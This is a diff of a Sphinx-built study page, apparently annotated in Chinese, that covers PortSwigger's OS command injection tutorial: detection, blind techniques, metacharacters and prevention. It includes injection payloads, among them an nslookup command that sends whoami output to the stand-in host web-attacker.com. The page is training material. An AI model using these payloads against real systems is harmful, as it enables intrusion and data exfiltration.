@@ -50,7 +50,7 @@
 <li class="toctree-l2"><a class="reference internal" href="../path-traversal/readme.html">Path traversal</a></li>
 <li class="toctree-l2 current"><a class="reference internal" href="readme.html">Command Injection</a><ul class="current">
 <li class="toctree-l3 current"><a class="current reference internal" href="#">OS command injection</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#labs">Labs</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#lab">LAB</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#what-is-os-command-injection">What is OS command injection?</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#executing-arbitrary-commands">Executing arbitrary commands</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#useful-commands">Useful commands</a></li>
@@ -107,8 +107,8 @@
 <h1>OS command injection<a class="headerlink" href="#os-command-injection" title="Permalink to this heading"></a></h1>
 <p>In this section, we’ll explain what OS command injection is, describe how vulnerabilities can be detected and exploited, spell out some useful commands and techniques for different operating systems, and summarize how to prevent OS command injection.</p>
 <p><img alt="image-20230915153508996" src="../../../_images/image-20230915153508996.png" /></p>
-<section id="labs">
-<h2>Labs<a class="headerlink" href="#labs" title="Permalink to this heading"></a></h2>
+<section id="lab">
+<h2>LAB<a class="headerlink" href="#lab" title="Permalink to this heading"></a></h2>
 <p>If you’re already familiar with the basic concepts behind OS command injection vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.</p>
 <p><a class="reference external" href="https://portswigger.net/web-security/all-labs#os-command-injection">View all OS command injection labs</a></p>
 </section>
@@ -123,7 +123,7 @@
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>https://insecure-website.com/stockStatus?productID=381&amp;storeID=29
 </pre></div>
 </div>
-<p>To provide the stock information, the application must query various <strong>legacy</strong>（（软件或硬件）已过时但因使用范围广而难以替代的） systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:</p>
+<p>To provide the stock information, the application must query various <strong>legacy</strong> (已过时但因使用范围广而难以替代的软件或硬件) systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">stockreport</span><span class="o">.</span><span class="n">pl</span> <span class="mi">381</span> <span class="mi">29</span>
 </pre></div>
 </div>
@@ -147,9 +147,12 @@
 <li><p>The original argument <code class="docutils literal notranslate"><span class="pre">29</span></code> was executed as a command, which caused an error.</p></li>
 </ul>
 <p>Placing the additional command separator <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> after the injected command is generally useful because it separates the injected command from whatever follows the injection point. This reduces the likelihood that what follows will prevent the injected command from executing.</p>
-<p><strong>LAB</strong></p>
+<section id="id1">
+<h3>LAB<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h3>
 <p><a class="reference external" href="https://portswigger.net/web-security/os-command-injection/lab-simple">OS command injection, simple case</a></p>
 </section>
+</section>
+<hr class="docutils" />
 <section id="useful-commands">
 <h2>Useful commands<a class="headerlink" href="#useful-commands" title="Permalink to this heading"></a></h2>
 <p>When you have identified an OS command injection vulnerability, it is generally useful to execute some initial commands to obtain information about the system that you have compromised. Below is a summary of some commands that are useful on Linux and Windows platforms:</p>
@@ -192,9 +195,9 @@
 </pre></div>
 </div>
 <p>The output from the <code class="docutils literal notranslate"><span class="pre">mail</span></code> command (if any) is not returned in the application’s responses, and so using the <code class="docutils literal notranslate"><span class="pre">echo</span></code> payload would not be effective. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.</p>
-<blockquote>
-<div><p>最后通过?filename=xxx读取</p>
-</div></blockquote>
+<ul class="simple">
+<li><p>最后通过?filename=xxx读取</p></li>
+</ul>
 <section id="detecting-blind-os-command-injection-using-time-delays">
 <h3>Detecting blind OS command injection using time delays<a class="headerlink" href="#detecting-blind-os-command-injection-using-time-delays" title="Permalink to this heading"></a></h3>
 <p>You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond. The <code class="docutils literal notranslate"><span class="pre">ping</span></code> command is an effective way to do this, as it lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run:</p>
@@ -202,31 +205,39 @@
 </pre></div>
 </div>
 <p>This command will cause the application to ping its loopback network adapter for 10 seconds.</p>
-<p><strong>LAB</strong></p>
+<section id="id2">
+<h4>LAB<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h4>
 <p><a class="reference external" href="https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays">Blind OS command injection with time delays</a></p>
-<blockquote>
-<div><p>注意+号在burp中已经是空格的意思，不要对其进行url编码，否则命令会执行失败。</p>
-</div></blockquote>
+<ul class="simple">
+<li><p>注意+号在burp中已经是空格的意思，不要对其进行url编码，否则命令会执行失败。</p></li>
+</ul>
 </section>
+</section>
+<hr class="docutils" />
 <section id="exploiting-blind-os-command-injection-by-redirecting-output">
 <h3>Exploiting blind OS command injection by redirecting output<a class="headerlink" href="#exploiting-blind-os-command-injection-by-redirecting-output" title="Permalink to this heading"></a></h3>
 <p>You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location <code class="docutils literal notranslate"><span class="pre">/var/www/static</span></code>, then you can submit the following input:</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&amp;</span> <span class="n">whoami</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">static</span><span class="o">/</span><span class="n">whoami</span><span class="o">.</span><span class="n">txt</span> <span class="o">&amp;</span>
+<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="p">&amp;</span><span class="w"> </span>whoami<span class="w"> </span>&gt;<span class="w"> </span>/var/www/static/whoami.txt<span class="w"> </span><span class="p">&amp;</span>
 </pre></div>
 </div>
 <p>The <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> character sends the output from the <code class="docutils literal notranslate"><span class="pre">whoami</span></code> command to the specified file. You can then use the browser to fetch <code class="docutils literal notranslate"><span class="pre">https://vulnerable-website.com/whoami.txt</span></code> to retrieve the file, and view the output from the injected command.</p>
-<p><strong>LAB</strong></p>
+<section id="id3">
+<h4>LAB<a class="headerlink" href="#id3" title="Permalink to this heading"></a></h4>
 <p><a class="reference external" href="https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection">Blind OS command injection with output redirection</a></p>
 </section>
+</section>
+<hr class="docutils" />
 <section id="exploiting-blind-os-command-injection-using-out-of-band-oast-techniques">
 <h3>Exploiting blind OS command injection using out-of-band (<a class="reference external" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>) techniques<a class="headerlink" href="#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques" title="Permalink to this heading"></a></h3>
 <p>You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&amp;</span> <span class="n">nslookup</span> <span class="n">kgji2ohoyw</span><span class="o">.</span><span class="n">web</span><span class="o">-</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span> <span class="o">&amp;</span>
+<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="p">&amp;</span><span class="w"> </span>nslookup<span class="w"> </span>kgji2ohoyw.web-attacker.com<span class="w"> </span><span class="p">&amp;</span>
 </pre></div>
 </div>
 <p>This payload uses the <code class="docutils literal notranslate"><span class="pre">nslookup</span></code> command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.</p>
-<p><strong>LAB</strong></p>
+<section id="id4">
+<h4>LAB<a class="headerlink" href="#id4" title="Permalink to this heading"></a></h4>
 <p><a class="reference external" href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band">Blind OS command injection with out-of-band interaction</a></p>
+<hr class="docutils" />
 <p>The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;
 </pre></div>
@@ -235,10 +246,14 @@
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wwwuser</span><span class="o">.</span><span class="n">kgji2ohoyw</span><span class="o">.</span><span class="n">web</span><span class="o">-</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span>
 </pre></div>
 </div>
-<p><strong>LAB</strong></p>
+</section>
+<section id="id5">
+<h4>LAB<a class="headerlink" href="#id5" title="Permalink to this heading"></a></h4>
 <p><a class="reference external" href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration">Blind OS command injection with out-of-band data exfiltration</a></p>
 </section>
 </section>
+</section>
+<hr class="docutils" />
 <section id="ways-of-injecting-os-commands">
 <h2>Ways of injecting OS commands<a class="headerlink" href="#ways-of-injecting-os-commands" title="Permalink to this heading"></a></h2>
 <p>A variety of shell metacharacters can be used to perform OS command injection attacks.</p>
@@ -255,17 +270,19 @@
 <li><p>Newline (<code class="docutils literal notranslate"><span class="pre">0x0a</span></code> or <code class="docutils literal notranslate"><span class="pre">\n</span></code>)</p></li>
 </ul>
 <p>On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>`要注入的命令`
+$(要注入的命令)
+</pre></div>
+</div>
 <ul class="simple">
-<li><p>`
-injected command`</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">$(</span></code>injected command <code class="docutils literal notranslate"><span class="pre">)</span></code></p></li>
+<li><p>其实就是用反引号以及美元符号加上括号把要注入的命令包裹起来。</p></li>
 </ul>
 <p>Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow <strong>in-band retrieval</strong>（带内检索） of command output or are useful only for blind exploitation.</p>
 <p>Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using <code class="docutils literal notranslate"><span class="pre">&quot;</span></code> or <code class="docutils literal notranslate"><span class="pre">'</span></code>) before using suitable shell metacharacters to inject a new command.</p>
 </section>
 <section id="how-to-prevent-os-command-injection-attacks">
 <h2>How to prevent OS command injection attacks<a class="headerlink" href="#how-to-prevent-os-command-injection-attacks" title="Permalink to this heading"></a></h2>
-<p>By far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In virtually every case, there are alternate ways of implementing the required functionality using safer platform APIs.</p>
+<p>By far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In <strong>virtually(几乎)</strong> every case, there are alternate ways of implementing the required functionality using safer platform APIs.</p>
 <p>If it is considered unavoidable to call out to OS commands with user-supplied input, then strong input validation must be performed. Some examples of effective validation include:</p>
 <ul class="simple">
 <li><p>Validating against a whitelist of permitted values.</p></li>
@@ -273,10 +290,6 @@ injected command`</p></li>
 <li><p>Validating that the input contains only alphanumeric characters, no other syntax or whitespace.</p></li>
 </ul>
 <p>Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.</p>
-<section id="read-more">
-<h3>Read more<a class="headerlink" href="#read-more" title="Permalink to this heading"></a></h3>
-<p><a class="reference external" href="https://portswigger.net/burp/vulnerability-scanner">Find OS command injection vulnerabilities using Burp Suite’s web vulnerability scanner</a><a class="reference external" href="https://portswigger.net/research/hunting-asynchronous-vulnerabilities">Read PortSwigger Research’s writeup of the Hunting Asynchronous Vulnerabilities presentation from 44Con and BSides Manchester</a></p>
-</section>
 </section>
 </section>
 
